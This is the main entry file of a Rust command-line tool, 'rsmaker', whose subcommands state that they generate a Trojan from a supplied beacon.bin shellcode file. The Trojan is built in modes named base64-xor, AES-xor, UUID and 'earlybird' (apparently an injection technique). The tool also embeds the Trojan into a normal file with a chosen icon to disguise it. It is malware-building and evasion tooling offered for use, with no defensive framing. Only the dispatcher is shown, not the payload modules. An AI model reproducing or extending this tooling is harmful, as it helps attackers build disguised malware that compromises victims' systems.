mod aes_xor;
mod base64_xor;
mod bird2;
mod earlybird;
mod embed;
mod uuid_base64;
use clap::{App, Arg, SubCommand};
use rsmaker::read_file;

fn main() {
    let matches = App::new("rsmaker")
        .subcommand(
            SubCommand::with_name("generate")
                .about("Generate a Trojan")
                .arg(
                    Arg::with_name("file")
                        .short('f')
                        .help("Choose a beacon.bin")
                        .takes_value(true)
                        .required(true),
                )
                .arg(
                    Arg::with_name("model")
                        .short('m')
                        .help("Choose one from normal, aes, uuid")
                        .takes_value(true)
                        .required(true),
                ),
        )
        .subcommand(
            SubCommand::with_name("embed")
                .about("embed a Trojan and a normal file")
                .arg(
                    Arg::with_name("file")
                        .short('f')
                        .help("Choose a normal file")
                        .takes_value(true)
                        .required(true),
                )
                .arg(
                    Arg::with_name("trojan")
                        .short('t')
                        .help("Choose a trojan file")
                        .takes_value(true)
                        .required(true),
                )
                .arg(
                    Arg::with_name("icon")
                        .short('i')
                        .help("Choose a icon file (xxx.ico)")
                        .takes_value(true)
                        .required(true),
                ),
        )
        .get_matches();

    if matches.subcommand_matches("generate") != None {
        let filename = matches
            .subcommand_matches("generate")
            .unwrap()
            .value_of("file")
            .unwrap();
        let shellcode = read_file(String::from(filename));

        match matches
            .subcommand_matches("generate")
            .unwrap()
            .value_of("model")
        {
            Some(model) => {
                if model == "normal" {
                    base64_xor::base64xor::run(shellcode).unwrap();
                } else if model == "aes" {
                    aes_xor::aesxor::run(shellcode).unwrap();
                } else if model == "uuid" {
                    uuid_base64::uuidbase64::run(shellcode).unwrap();
                } else if model == "bird" {
                    earlybird::earlybird::run(shellcode).unwrap();
                } else if model == "bird2" {
                    bird2::bird2::run(shellcode).unwrap();
                }
            }
            None => {
                println!("please choice right model name(normal,aes,uuid)");
            }
        };
    } else {
        let file = matches
            .subcommand_matches("embed")
            .unwrap()
            .value_of("file")
            .unwrap();
        let trojan = matches
            .subcommand_matches("embed")
            .unwrap()
            .value_of("trojan")
            .unwrap();
        let icon = matches
            .subcommand_matches("embed")
            .unwrap()
            .value_of("icon")
            .unwrap();

        embed::embed::run(String::from(file), String::from(trojan), String::from(icon)).unwrap();
    }
}
